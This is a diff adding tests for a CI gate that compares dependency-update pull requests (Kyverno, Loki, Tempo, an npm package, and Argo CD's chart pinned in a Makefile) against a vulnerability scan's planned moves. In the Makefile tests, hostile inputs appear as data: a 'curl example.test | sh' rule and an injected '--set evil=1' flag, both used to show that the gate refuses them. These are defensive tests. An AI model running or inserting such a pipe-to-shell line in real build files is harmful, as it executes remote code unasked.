@@ -258,6 +258,151 @@ describe('a move: the scan’s moves, made by the gate on main, the same as the 
   });
 });
 
+describe('a routine update: a move no finding asks for, made and compared as any other', () => {
+  const NONE = { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0, UNKNOWN: 0 };
+  /** The day with Kyverno's background controller merely behind, its admission controller's move a finding's still. */
+  const day = SCAN.map((m) =>
+    m.name === 'reg.kyverno.io/kyverno/background-controller' ? { ...m, clears: NONE, leaves: NONE } : m,
+  );
+  const line = (text: string, at: number, to: string) =>
+    text
+      .split('\n')
+      .map((each, i) => (i === at - 1 ? each.replace(`v1.19.1@${D_OLD}`, to) : each))
+      .join('\n');
+  const kyverno = MAIN[KYVERNO] as string;
+
+  it('passes the pull request of a file’s routine updates while its fix is in another, and the fix’s while they are', async () => {
+    const routine = await prove(change({ [KYVERNO]: line(kyverno, 4, `v1.20.0@${D_NEW}`) }), day);
+    expect(routine).toEqual({
+      rule: 'move',
+      title:
+        'The scan’s move of reg.kyverno.io/kyverno/background-controller to v1.20.0, made by the gate on main and the same as the pull request',
+    });
+    const fix = await prove(change({ [KYVERNO]: line(kyverno, 2, `v1.20.0@${D_NEW}`) }), day);
+    expect(fix).toMatchObject({
+      rule: 'move',
+      title: expect.stringContaining('move of reg.kyverno.io/kyverno/kyverno'),
+    });
+    // Once one has merged, the other is the same move on main as it is then.
+    const merged = line(kyverno, 2, `v1.20.0@${D_NEW}`);
+    const after = [modified(KYVERNO, merged, line(merged, 4, `v1.20.0@${D_NEW}`))];
+    expect(await proveMove(after, day, { ...io(), base: (path) => (path === KYVERNO ? merged : MAIN[path]) }, false))
+      // The fix's pin is no longer the line the scan read, and is carried by nothing: the routine update alone.
+      .toMatchObject({ rule: 'move', title: expect.stringContaining('move of reg.kyverno.io/kyverno/background') });
+  });
+
+  it('holds a routine update to the scan’s target and to its pins, as it holds a fix', async () => {
+    expect(reasonOf(await prove(change({ [KYVERNO]: line(kyverno, 4, `v1.20.1@${D_NEW}`) }), day))).toMatch(
+      /deploy\/base\/kyverno\/values\.yaml:4 is .* where the scan's moves make/,
+    );
+    expect(reasonOf(await prove(change({ [KYVERNO]: line(kyverno, 4, `v1.20.0@${D_OTHER}`) }), day))).toMatch(
+      /where the scan's moves make/,
+    );
+    // A pull request that rewrites a pin of each carries both, and must make both as the scan does.
+    const both = kyverno.replaceAll(`v1.19.1@${D_OLD}`, `v1.20.0@${D_NEW}`);
+    expect(await prove(change({ [KYVERNO]: both }), day)).toMatchObject({
+      rule: 'move',
+      title: expect.stringContaining('2 moves'),
+    });
+    const half = line(line(kyverno, 2, `v1.20.0@${D_NEW}`), 4, `v1.19.9@${D_NEW}`);
+    expect(reasonOf(await prove(change({ [KYVERNO]: half }), day))).toMatch(/values\.yaml:4 is/);
+  });
+
+  it('names a routine update across a major `major`: it clears no Critical, as it clears nothing', async () => {
+    const behind = SCAN.map((m) => (m.name === 'loki' ? { ...m, clears: NONE } : m));
+    const result = await prove(change({ [LOKI]: swap(LOKI, '18.13.7', '21.2.3') }), behind);
+    // Its title says what it is, in place of a rating of findings it does not have.
+    expect(result).toEqual({
+      rule: 'major',
+      title:
+        'The scan’s move of loki to 21.2.3, made by the gate on main and the same as the pull request; a routine update across a major, with no finding behind it: loki',
+    });
+    // Beside a finding's major in one pull request, each is named for what it is.
+    const two = [
+      ...behind,
+      move({
+        name: 'tempo',
+        pins: [{ file: PROMETHEUS, line: 6 }],
+        from: '29.35.0',
+        to: 'chart tempo 30.0.0 (a major)',
+        major: true,
+      }),
+    ].filter((m) => m.name !== 'prometheus');
+    const both = await prove(
+      change({ [LOKI]: swap(LOKI, '18.13.7', '21.2.3'), [PROMETHEUS]: swap(PROMETHEUS, '29.35.0', '30.0.0') }),
+      two,
+    );
+    expect(both).toMatchObject({
+      rule: 'major',
+      title: expect.stringContaining(
+        '; a major that clears no Critical by Trivy’s rating: tempo; a routine update across a major, with no finding behind it: loki',
+      ),
+    });
+  });
+
+  it('passes a routine update of the app’s lockfile, its package from the state’s record, made by the pin step', async () => {
+    const routine: ScanMove = { ...packageMove('@grpc/grpc-js', '1.14.5', '1.14.7', 3), clears: NONE, leaves: NONE };
+    const scan = [routine, APP_SCAN[1] as ScanMove];
+    const asked: PinStepMove[][] = [];
+    const result = await proveApp(
+      change({ [LOCK]: lockfile('1.14.7', '7.6.5'), 'package.json': swap('package.json', '1.14.5', '1.14.7') }),
+      step(asked),
+      scan,
+    );
+    expect(result).toEqual({
+      rule: 'move',
+      title:
+        'The scan’s move of a package in `pnpm-lock.yaml`, made by the gate on main and the same as the pull request',
+    });
+    // Asked as the line's pin step is: a routine update, held to exactly its target.
+    expect(asked).toEqual([[{ ecosystem: 'npm', name: '@grpc/grpc-js', from: '1.14.5', to: '1.14.7', routine: true }]]);
+    // A fix of the same package is asked for with its target a floor, as it is made.
+    const fixes: PinStepMove[][] = [];
+    await proveApp(change({ [LOCK]: lockfile('1.14.7', '7.6.5') }), step(fixes));
+    expect(fixes).toEqual([[{ ecosystem: 'npm', name: '@grpc/grpc-js', from: '1.14.5', to: '1.14.7' }]]);
+  });
+});
+
+describe('the Makefile’s pin of Argo CD’s chart, which the App writes', () => {
+  const MAKEFILE = ['CLUSTER := software-factory', 'ARGOCD_CHART := 10.15.0', 'up:', '\thelm upgrade argocd', ''].join(
+    '\n',
+  );
+  const chart = move({
+    name: 'argo-cd',
+    pins: [{ file: 'Makefile', line: 2 }],
+    from: '10.15.0',
+    to: 'chart argo-cd 10.16.2',
+  });
+  const proveMakefile = (head: string) =>
+    proveMove(
+      [modified('Makefile', MAKEFILE, head)],
+      [...SCAN, chart],
+      { ...io(), base: (path) => (path === 'Makefile' ? MAKEFILE : MAIN[path]) },
+      false,
+    );
+
+  it('passes the chart’s version moved to the scan’s target, and nothing else of the Makefile', async () => {
+    expect(await proveMakefile(MAKEFILE.replace('10.15.0', '10.16.2'))).toEqual({
+      rule: 'move',
+      title: 'The scan’s move of argo-cd to 10.16.2, made by the gate on main and the same as the pull request',
+    });
+  });
+
+  it('refuses a second changed line of the Makefile, and the chart moved to any other version', async () => {
+    const moved = MAKEFILE.replace('10.15.0', '10.16.2');
+    expect(
+      reasonOf(await proveMakefile(moved.replace('helm upgrade argocd', 'helm upgrade argocd --set evil=1'))),
+    ).toBe("Makefile:4 is `helm upgrade argocd --set evil=1` where the scan's moves make `helm upgrade argocd`");
+    expect(reasonOf(await proveMakefile(`${moved}also:\n\tcurl example.test | sh\n`))).toMatch(/^Makefile:5 is /);
+    expect(reasonOf(await proveMakefile(moved.replace('software-factory', 'another')))).toMatch(/^Makefile:1 is /);
+    expect(reasonOf(await proveMakefile(MAKEFILE.replace('10.15.0', '10.16.3')))).toBe(
+      "Makefile:2 is `ARGOCD_CHART := 10.16.3` where the scan's moves make `ARGOCD_CHART := 10.16.2`",
+    );
+    // A change to the Makefile that rewrites no pin is no move at all.
+    expect(await proveMakefile(MAKEFILE.replace('software-factory', 'another'))).toHaveProperty('none');
+  });
+});
+
 describe('a lockfile’s move, made by the line’s pin step on main (tests 8a and 13)', () => {
   const grpc = { [LOCK]: lockfile('1.14.7', '7.6.5'), 'package.json': swap('package.json', '1.14.5', '1.14.7') };
 
